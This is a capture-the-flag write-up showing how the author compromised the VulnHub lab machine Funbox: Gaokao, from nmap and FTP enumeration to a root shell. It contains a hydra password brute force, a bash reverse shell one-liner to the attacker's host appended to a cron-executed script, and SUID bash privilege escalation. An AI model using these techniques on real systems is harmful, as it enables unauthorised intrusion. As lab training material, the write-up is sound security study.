Here is a technical write-up detailing my approach to solving the VulnHub machine.

### 1. Initial Reconnaissance

I began by identifying the target machine's IP address using `netdiscover`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ netdiscover
Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts
                                                                                                                                                                                                                                                                          3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 162
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.1.1                            1      42  
192.168.1.38    08:00:27:67:ce:0d      1      60  PCS Systemtechnik GmbH
```

The output indicated `192.168.1.38` as a potential target, based on the "PCS Systemtechnik GmbH" MAC vendor.

I then performed an Nmap scan to enumerate open ports and services.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ nmap -sS -sV -sC -Pn  --min-rate=1000 --max-retries=2 192.168.1.38 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 12:21 CDT
Nmap scan report for 192.168.1.38
Host is up (0.00012s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: |   2048 48:39:31:22:fb:c2:03:44:a7:4e:c0:fa:b8:ad:2f:96 (RSA)
|   256 70:a7:74:5e:a3:79:60:28:1a:45:4c:ab:5c:e7:87:ad (ECDSA)
|_  256 9c:35:ce:f6:59:66:7f:ae:c4:d1:21:16:d5:aa:56:71 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wellcome to Funbox: Gaokao !
3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.34_Auto_Generated_Server_Certificate
| Not valid before: 2021-06-05T15:15:30
|_Not valid after:  2031-06-03T15:15:30
| mysql-info:
|   Protocol: 10
|   Version: 5.7.34-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, IgnoreSigpipes, DontAllowDatabaseTableColumn, Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, InteractiveClient, SupportsTransactions, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, FoundRows, SupportsCompression, ConnectWithDatabase, ODBCClient, LongPassword, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Kt\x15=S\x13?Iu\x0D!O;066H\x02\x02\x14
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:67:CE:0D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.28 seconds
```

The Nmap scan revealed the following open ports:

- **Port 21 (FTP):** Running ProFTPD 1.3.5e, with anonymous login allowed.
- **Port 22 (SSH):** Running OpenSSH 7.6p1 on Ubuntu.
- **Port 80 (HTTP):** Running Apache httpd 2.4.29 on Ubuntu, with the title "Wellcome to Funbox: Gaokao !".
- **Port 3306 (MySQL):** Running MySQL 5.7.34.


### 2. FTP Enumeration

Given the open FTP port with anonymous login enabled, I started by connecting to the FTP server.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ ftp 192.168.1.38
Connected to 192.168.1.38.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.1.38]
Name (192.168.1.38:zengla): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.1.5 !
230-
230-The local time is: Sat Jul 19 17:22:40 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <sky@funbox9>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||40129|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 .
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 ..
-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
226 Transfer complete
ftp> get welcome.msg
local: welcome.msg remote: welcome.msg
229 Entering Extended Passive Mode (|||21533|)
150 Opening BINARY mode data connection for welcome.msg (169 bytes)
100% |**************************************************************************************************************************|   169        1.30 MiB/s    00:00 ETA
226 Transfer complete
169 bytes received in 00:00 (6.38 KiB/s)
ftp> exit
221 Goodbye.
```

I successfully logged in anonymously and downloaded the `welcome.msg` file. I then attempted to upload a modified version of `welcome.msg`, but the server denied the operation.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ ftp 192.168.1.38
Connected to 192.168.1.38.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.1.38]
Name (192.168.1.38:zengla): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.1.5 !
230-
230-The local time is: Sat Jul 19 17:22:59 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <sky@funbox9>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put welcome.msg
local: welcome.msg remote: welcome.msg
229 Entering Extended Passive Mode (|||65408|)
550 welcome.msg: Operation not permitted
ftp> exit
221 Goodbye.
```

The FTP server's configuration prevented anonymous users from uploading files.

### 3. Web Enumeration

I proceeded with web content enumeration using `gobuster` to discover hidden directories and files.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ gobuster dir -u 192.168.1.38 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.38
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

The initial `gobuster` scan only revealed `/server-status`, which returned a 403 Forbidden error. I expanded the scan to include common file extensions.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ gobuster dir -u 192.168.1.38 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.38
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10310]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
```

This scan revealed `index.html`, which returned a 200 OK status code.

I then attempted to identify virtual host names by fuzzing the Host header.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ ffuf -u 'http://funbox.local' -H "Host: FUZZ.funbox.local"  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
# ... (truncated output) ...
crack                   [Status: 200, Size: 10310, Words: 3263, Lines: 365, Duration: 2ms]
index                   [Status: 200, Size: 10310, Words: 3263, Lines: 365, Duration: 4ms]
default                 [Status: 200, Size: 10310, Words: 3263, Lines: 365, Duration: 4ms]
# ... (truncated output) ...
```

The `ffuf` scan identified several subdomains that returned the same content as the main page, including `crack.funbox.local`.

### 4. Exploiting FTP with Hydra

Given the limited success with web enumeration, I shifted my focus to the FTP service. I attempted to brute-force the FTP login using `hydra` with the username `sky` ( which was found in the welcome.msg file downloaded from the ftp server ) and the `rockyou.txt` wordlist.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ hydra -l sky -P /usr/share/wordlists/rockyou.txt 192.168.1.38 -s 21 ftp
# ... (truncated output) ...
[21][ftp] host: 192.168.1.38   login: sky   password: thebest
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-19 12:37:40
```

`hydra` successfully cracked the FTP password for the user `sky`: `thebest`.

I logged into the FTP server using the cracked credentials.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/funboxgaokao]
└─$ ftp 192.168.1.38
Connected to 192.168.1.38.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.1.38]
Name (192.168.1.38:zengla): sky
331 Password required for sky
Password:
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
```

I found a file named `user.flag` with permissions `-rwxr-x---`, owned by `sky` and the group `sarah`.

```shellscript
ftp> ls
229 Entering Extended Passive Mode (|||26633|)
150 Opening ASCII mode data connection for file list
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
226 Transfer complete
```

I downloaded the `user.flag` file.

```shellscript
ftp> get user.flag
local: user.flag remote: user.flag
229 Entering Extended Passive Mode (|||17673|)
150 Opening BINARY mode data connection for user.flag (66 bytes)
100% |**************************************************************************************************************************|    66      758.27 KiB/s    00:00 ETA
226 Transfer complete
66 bytes received in 00:00 (65.90 KiB/s)
```

I then attempted to read the contents of the file.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/funboxgaokao]
└─$ cat user.flag
  #!/bin/shecho "Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd"
```

The `user.flag` file was a shell script that echoed a string. This suggested that the file might be executed as a cron job.

To gain a shell as the `sarah` user, I appended a reverse shell command to the `user.flag` script.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ echo "bash -i >& /dev/tcp/192.168.1.5/4444 0>&1" >> user.flag
```

I then uploaded the modified `user.flag` file back to the FTP server.

```shellscript
ftp> put user.flag
local: user.flag remote: user.flag
229 Entering Extended Passive Mode (|||52024|)
150 Opening BINARY mode data connection for user.flag
100% |**************************************************************************************************************************|   108        1.22 MiB/s    00:00 ETA
226 Transfer complete
108 bytes sent in 00:00 (84.98 KiB/s)
```

I set up a `netcat` listener on my attacking machine.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ nc -lnvp 4444
```

After waiting for the cron job to execute, I received a reverse shell as the `sarah` user.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/funboxgaokao]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.38 47842
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)
```

### 5. Privilege Escalation

I attempted to use `sudo -l` to check for commands that `sarah` could run as root, but it required a TTY.

```shellscript
bash-4.4$ sudo -l
sudo: no tty present and no askpass program specified
```

I spawned a TTY shell using Python.

```shellscript
bash-4.4$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
```

I then checked for SUID binaries using `find / -perm -4000 2> /dev/null`.

```shellscript
bash-4.4$ find / -perm -4000 2> /dev/null
/bin/bash
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
```

The `/bin/bash` binary had the SUID bit set. I then executed `/bin/bash -p` to obtain a root shell.

```shellscript
bash-4.4$ /bin/bash -p
/bin/bash -p
bash-4.4# id
uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)
```

I navigated to the `/root` directory and retrieved the root flag.

```shellscript
bash-4.4# cd /root
cd /root
bash-4.4# ls
ls
root.flag
bash-4.4# cat root.flag
cat root.flag
  █████▒█    ██  ███▄    █  ▄▄▄▄    ▒█████  ▒██   ██▒     ▄████  ▄▄▄       ▒█████   ██ ▄█▀▄▄▄       ▒█████  ▓██   ▒ ██  ▓██▒ ██ ▀█   █ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░    ██▒ ▀█▒▒████▄    ▒██▒  ██▒ ██▄█▒▒████▄    ▒██▒  ██▒▒████ ░▓██  ▒██░▓██  ▀█ ██▒▒██▒ ▄██▒██░  ██▒░░  █   ░   ▒██░▄▄▄░▒██  ▀█▄  ▒██░  ██▒▓███▄░▒██  ▀█▄  ▒██░  ██▒░▒█░   ▒▒█████▓ ▒██░   ▓██░░▓█  ▀█▓░ ████▓▒░▒██░█▀  ▒██   ██▒   ░ █ █ ▒    ░▓█  ██▓░██▄▄▄▄██ ▒██   ██░▓██ █▄░██▄▄▄▄██ ▒██   ██▒░ ████▓▒░ ▒▒ ░ ░ ░ ░ ░░   ░ ▒░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░     ░   ░   ▒   ▒▒ ░  ░ ▒ ▒░ ░ ░▒ ▒░ ▒   ▒▒ ░  ░ ▒ ▒░  ░ ░    ░░░ ░ ░    ░   ░ ░  ░    ░ ░ ░ ░ ▒   ░    ░     ░ ░   ░   ░   ▒   ░ ░ ░ ▒  ░ ░░ ░  ░   ▒   ░ ░ ░ ▒            ░              ░  ░          ░ ░   ░    ░           ░       ░  ░    ░ ░  ░  ░        ░  ░    ░ ░                                   ░                                                                          You did it ! THX for playing Funbox: GAOKAO !
I look forward to see this screenshot on twitter: @0815R2d2
```

The root flag is `You did it ! THX for playing Funbox: GAOKAO !I look forward to see this screenshot on twitter: @0815R2d2`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified target IP and open ports (FTP, SSH, HTTP, MySQL).
2. **FTP Enumeration:** Discovered anonymous FTP login.
3. **Credential Cracking:** Cracked the `sky` user's FTP password using `hydra`.
4. **Initial Foothold:** Logged into FTP as `sky` and uploaded a reverse shell to `user.flag`.
5. **Privilege Escalation:** Obtained a shell as the `sarah` user via the cron job. Exploited the SUID `/bin/bash` binary to gain root privileges.
